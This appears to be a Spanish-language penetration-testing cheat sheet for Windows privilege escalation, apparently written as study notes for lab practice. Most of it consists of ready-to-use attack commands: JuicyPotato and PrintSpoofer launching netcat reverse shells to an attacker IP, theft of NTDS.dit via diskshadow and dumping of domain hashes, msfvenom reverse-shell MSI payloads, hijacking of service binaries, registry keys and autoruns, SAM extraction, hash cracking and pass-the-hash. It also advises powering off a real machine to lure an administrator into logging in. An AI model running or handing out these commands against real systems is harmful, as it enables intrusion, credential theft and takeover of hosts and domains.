## Info

- Windows usa access tokens para interrelacionarse con las apps y gestionar la autenticación de manera sencilla y automática, funciona como el HASH

## Abuso de privilegios

### Abusar del SeImpersonate priv
Si nuestro usuario tiene el privilegio de SeImpersonate podemos abusar de él y conseguir una shell reversa.
#### Escalar privilegios con JuiciPotato:
##### Juicipotato no funciona en WS 2019 y windows 10 build 1809 en adelante. Para estos casos usar printspoofer o rogepotato
- l = local port
- p = programa a correr
- a = Argumento que se le va a pasar al programa
- t = creación de proceso 

    JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
    

#### Escalar privilegios con PrintSpoofer
    PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

### Abusar del SeDebugPrivilege

Podemos usar mimikatz para dumpear las contraseñas guardadas en la caché. Para llevar adelante este ataque mirar:

https://github.com/LaPorota/LaPorota_suite/blob/main/infraestructura/windows/dump_credentials_cached_mimikatz.md


### Abusar del SeTakeOwnershipPrivilege
Si tenemos este privilegio podemos tomar control de recursos que no nos pertenecen y no son accesibles por nosotros.
##### Si el permiso está pero se encuentra deshabilitado podemos usar el siguiente script

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

Luego elegimos el archivo sobre el que queremos tomar control y usamos el binario de windows takeown

        takeown /f 'path_to_file'
##### Hay casos en que esto no es suficiente debido a los ACL del AD. para estos casos podemos usar icacls:

        icacls 'path_to_file' /grant <our_user>:F

### Abuso de SeBackupPrivilege
Este privilegio nos permite listar y copiar el contenido de cualquier carpeta.
#### Si el permiso se encuentra pero está deshabilitado podemos usar el siguiente comando
        Set-SeBackupPrivilege
#### 1)Buscamos el archivo que no podemos leer y lo copiamos
         Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Luego podremos manipular el archivo para lograr acceder a su contenido (incluido enviarlo a un linux)

#### Atacando al domain controller copiando el NTDS.dit
El SeBackupPrivilege también nos permite loguearnos al DC en un antorno de AD

Podremos crear una copia del disco del DC y robar de él el NTDS.dit (archivo donde se guardan los hash NTLM de todos los usuarios del dominio)

#### 1) llamamos al proceso diskdhadow(viene con windows)
        diskshadow.exe
#### 2)hacemos la copia
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
#### 3) copiamos el NTDS.dit de la partición E: que acabamos de crear
        Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

#### 4) Extraer las credenciales del NTDS.dit

##### Windows:
        Import-Module .\DSInternals.psd1

Luego:
        $key = Get-BootKey -SystemHivePath .\SYSTEM

Y luego dumpeamos con:
        Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

        






        
*******
-------

## EXPLOTACION DE SERVICIOS

### Explotación de pipelist

#### 1)Listamos los pipelist:

##### Cmd:

        pipelist.exe /accepteula
##### Powershell:

        gci \\.\pipe\

#### 2)Enumeramos los permisos que tiene un pipelist

        accesschk.exe /accepteula \\.\Pipe\<nombre_del_pipe> -v


### EXPLOTACION DE SERVICIOS CON PERMISOS INSEGUROS:

Luego de listar los servicios corriendo en el servidor podemos consultar por medio de la herramienta accesschk.exe (tenemos que introducirla en el sistema) los permisos que tiene el user sobre la misma con el comando:

    accesschk.exe /accepteula -uwcqv USUARIO_EN_USO SERVICIO_A_CONSULTAR

si la opción SERVICE_CHANGE_CONFIG se encuentra dentro de RW(read and write)
Podremos modificar su configuración.

Podemos hacer una query al servicio para ver con qué privilegios/user corre con el comando:


    sc qc servicio

Si el servicio corre con usuarios administradores o super usuarios (SERVICE_START_NAME)nos es propicio para ser utilizado para elevar privilegios:
modificaremos el BINPATH del mismo para que al momento de ser ejecutado, llame a un nuevo proceso o programa malicioso.

    sc config daclsvc binpath= "\"C:\PATH\TO\MALICIOUS.exe""

ahora podemos correr el servicio y que nos genere una shell reversa:
    
    net start servicio

### EXPLOTACIÖN DE SERVICIOS UNQUOTED:

Es posible explotarlo cuando el path del servicio no está entre comillas y tiene espacios en los nombres del path.

Hacemos una query al servicio y vemos si el BINARY_PATH_FILE se encuentra con las caracteristicas antes mencionadas:

        sc qc servicio

Vemos con accesschk.exe quienes pueden escribir en el directorio del servicio:

        accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 

Si nuestro usuario/grupo al que pertenece puede leer y escribir reemplazamos el archivo commons.exe por nuestro binario con la reverse shell:

        copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

ponemos un netcat en listener y corremos el servicio


        net start servicio

### WEAK REGISTRY PERMISSIONS:

Una vez identificado un servicio que corre con privilegios elevados, corremos el accesschk.exe para ver si nuestro user/grupo al que pertenece puede escribir entradas de registro:

        accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicio

De tenerlos, podemos reescribir el imagepath key para que apunte a un archivo malicioso:


        reg add HKLM\SYSTEM\CurrentControlSet\services\service /v ImagePath /t REG_EXPAND_SZ /d C:\Path\to/malicious.exe /f

Iniciamos un netcat como listener y corremos el servicio

        net start regsvc

### INSECURE SERVICE EXECUTABLES

Una vez que detectamos el servicio con privilegios elevados, nos fijamos con accesschk.exe si el binario del servicio es writeable por nuestro user/grupo.

        C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\servicio.exe"

De tener permisos de escritura sobre el archivo, podemos reemplazarlo por nuestro archivo malicioso:

        copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\servicio.exe" /Y

Luego corremos netcat y corremos el servicio.

        net start servicio



## REGISTRY EXPLOITATION


### EXPLOIT AUTORUNS

Buscamos en el registro ejecutables de autoruns

        reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

usamos accesschk.exe para ver los permisos que tienen los autoruns

        accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\AUTORUN.exe"

Si nuestro user/grupo tiene permisos de escritura sobre el autorun, lo reemplazamos por el archivo malicioso y reiniciamos la pc(en un entorno real es mejor apagarla para llamar la atención del admin y 
que se loguee en la misma):

        copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

abrimos netcat y esperamos a que alguien encienda la máquina y se loguee


### ALWAYSINSTALLELEVATED 


Hacemos una query al registro buscando las keys de Alwaysinstallelevated

        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated


        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

si en ambos casos las keys están seteadas en 1 (0x1 == true)

generamos un archivo malicioso .msi con una shell reversa y lo pasamos a la víctima:

        msfvenom -p windows/x64/shell_reverse_tcp LHOST=NUESTRA_IP LPORT=PUERTO -f msi -o reverse.msi

lo instalamos y se nos va a generar una shell reversa con permisos de admin.

        msiexec /quiet /qn /i C:\PrivEsc\reverse.msi



## PASSWORDS

### REGISTRY

podemos buscar passwords en el registro de windows: 
Usualmente, si están, se encuentran en el archivo winlogon. De esta forma podemos listarlo:

        reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

De no estar ahí podemos expandir nuestra búsqueda listando archivos del registro que tengan la key o el value "password" y luego volver a listar cada uno con el comando anterior:

        reg query HKLM /f password /t REG_SZ /s

si encontramos la password podemos conectarnos desde kali con el winexe:

        winexe -U 'admin%password' //IP-VICTIMA cmd.exe


### SAVED CREDS

Podemos listar las credenciales guardadas en el sistema con el siguiente comando:

        cmdkey /list

Si entre las credenciales guardadas aparecen las del admin(no vamos a ver la password) podemos correr nuestro binario malicioso como admin y tener una reverse shell:


        runas /savecred /user:admin C:\PrivEsc\reverse.exe



### SAM

Si podemos extraer el SAM y System (usualmente se encuentran en la carpeta windows/repair)

podemos unirlos con creddump7 y extraer el hash, luego con hashcat podemos intentar romperlo:

        git clone https://github.com/Tib3rius/creddump7
        pip3 install pycrypto
        python3 creddump7/pwdump.py SYSTEM SAM

##### Luego las rompemos con hashcat

        hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

###### PASSING THE HASH

Si obtuvimos el hash pero no lo podemos romper, podemos loguearnos con el hash utilizando pth-winexe:

        pth-winexe -U 'admin%hash' //10.10.11.49 cmd.exe


### SCHEDULED TASKS

Si encontramos un archivo que corre tareas programadas y tenemos capacidades de escritura en los mismos podemos agregegarle una ejecución a nuestro binario malicioso:

        accesschk.exe /accepteula -wvu "C:\PATH\To\file"

##### La ruta al archivo maliciosa debe ser absoluta!!!

        echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

Esperamos con nuestro netcat a que se ejecute.

### INSECURE GUI APPS

Si vemos que una app corre como administrador (para esto necesitamos tener un entorno gráfico) podemos usarla para correr un cmd con los mismos privilegios:

Para ver con qué privilegios corre:

        tasklist /V | findstr binario_de_la_app.exe

Abrimos la app y le damos open para cargar un archivo "X" y en el explorador de windows colocamos:  

        file://c:/windows/system32/cmd.exe (o el path al cmd.exe)
